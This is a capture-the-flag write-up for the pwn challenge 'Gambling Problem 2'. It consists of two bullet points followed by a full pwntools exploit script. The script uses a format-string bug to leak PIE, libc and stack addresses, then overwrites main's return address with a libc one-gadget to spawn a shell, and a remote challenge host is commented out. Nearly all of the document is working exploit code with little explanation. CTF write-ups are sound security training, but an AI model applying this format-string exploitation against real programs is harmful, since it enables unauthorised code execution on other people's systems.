# Gambling Problem 2

- Leak using formatstring
- overwrite return address of main with one-gadget

```python
#!/usr/bin/python3
from pwn import *
from time import sleep
from formatstring import *

####Utils
def guessnumber(choice,bet,fuck=True):
	if fuck==False:
		io.sendlineafter("Choice : ","1")
		sleep(1)
		io.sendlineafter("no): ",str(choice))
		io.sendlineafter("bet : ",bet)
		LEAKS = io.recvline().strip().split(b"|")
		io.sendlineafter(")","1")
		return LEAKS[0],LEAKS[1],LEAKS[2]
	else:
		io.sendlineafter("no): ",str(choice))
		pause()
		io.sendlineafter("bet : ",bet)
		sleep(1)
		io.sendlineafter(")","1")

def shell():
	io.sendlineafter("no): ","0")
	io.sendlineafter("Choice : ","3")

####Addr
money = 0x402C
leak_offset = 0x1260
libc_leak_offset = 0x21b97

####Gadgets
gadget = [0x4f365,0x4f3c2,0x10a45c]

####Exploit
io = process(["./gamblingProblem"])
#io = remote("128.199.157.172",25880)
#io = ("localhost",9124)
pie_leak,libc_leak,stack_leak = guessnumber(1,"%34$p|%45$p|%38$p",fuck=False)
pie_base = int(pie_leak,0)-leak_offset
libc_base = int(libc_leak,0)-libc_leak_offset
stack_return = int(stack_leak,0)+0x8
print(f"Pie leak: {hex(pie_base)}")
print(f"Libc leak: {hex(libc_base)}")
print(f"Stack leak: {hex(stack_return)}")
settings = PayloadSettings(offset=10,arch=x86_64)
p = WritePayload()
p[stack_return] = p64(libc_base+gadget[0])
payload = p.generate(settings)
guessnumber(1,payload)
sleep(1)
shell()
io.interactive()
```
